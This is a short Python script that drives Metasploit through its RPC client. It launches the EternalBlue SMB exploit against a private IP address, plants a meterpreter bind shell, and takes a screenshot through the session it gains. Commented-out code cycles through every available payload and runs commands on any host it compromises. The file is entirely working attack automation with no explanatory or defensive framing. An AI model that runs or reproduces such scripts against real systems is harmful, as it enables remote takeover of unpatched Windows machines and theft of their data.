import subprocess
import smbclient
import re
from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('1qaz@WSX')
exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
exploit['RHOSTS']  = "10.10.3.65"
exploit.execute(payload='windows/x64/meterpreter/bind_tcp')
# payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
session_number = list(client.sessions.list.keys())[0]
shell = client.sessions.session(session_number)
shell.write('screenshot')
result = shell.read()
final_result = "\n".join(result.splitlines()[4:10])
print(final_result)
# for i in exploit.targetpayloads():
#     result = exploit.execute(payload=i)
#     if dict(result)['job_id']!="None":
#         if bool(client.sessions.list):
#             print(i)
#             session_number = list(client.sessions.list.keys())[0]
#             print(session_number)
#             shell = client.sessions.session(session_number)
#             shell.write('dir')
#             result = shell.read()
#             final_result = "\n".join(result.splitlines()[4:10])
            
#             print(final_result)
#             continue
#         else:
#             print("fail")
            